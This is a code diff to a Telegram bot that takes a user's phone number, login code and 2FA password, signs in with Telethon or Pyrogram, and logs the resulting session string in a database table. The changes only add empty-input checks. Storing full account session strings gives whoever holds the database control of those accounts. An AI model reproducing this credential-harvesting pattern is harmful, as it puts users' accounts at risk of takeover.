@@ -64,6 +64,10 @@ async def process_input(event):
     # ✅ Step 1: Enter Phone Number
     if step == "phone_pyro" or step == "phone_telethon":
         phone_number = event.message.text.strip()
+        if not phone_number:  # Ensure phone number is entered
+            await event.respond("❌ **Please enter a valid phone number.**")
+            return
+
         user_sessions[user_id]["phone"] = phone_number  # Store the phone number
 
         if step == "phone_pyro":
@@ -83,8 +87,12 @@ async def process_input(event):
     # ✅ Step 2: Enter OTP
     elif step == "otp":
         otp_code = event.message.text.strip()
+        phone_number = user_sessions[user_id].get("phone")  # Get phone number from user_sessions
+        if not otp_code:  # Ensure OTP is entered
+            await event.respond("❌ **Please enter a valid OTP.**")
+            return
+
         client = user_sessions[user_id]["client"]
-        phone_number = user_sessions[user_id]["phone"]
         phone_code_hash = user_sessions[user_id]["phone_code_hash"]  
 
         try:
@@ -120,6 +128,10 @@ async def process_input(event):
     # ✅ Step 3: Enter 2FA Password
     elif step == "password":
         password = event.message.text.strip()
+        if not password:  # Ensure password is entered
+            await event.respond("❌ **Please enter a valid password.**")
+            return
+
         client = user_sessions[user_id]["client"]
 
         try:
@@ -134,7 +146,7 @@ async def process_input(event):
             db_connection = get_db_connection()
             cursor = db_connection.cursor()
             cursor.execute("INSERT INTO session_logs (user_id, phone, session_string) VALUES (?, ?, ?)", 
-                           (user_id, phone_number, session_string))
+                           (user_id, user_sessions[user_id]["phone"], session_string))
             db_connection.commit()
             db_connection.close()
 
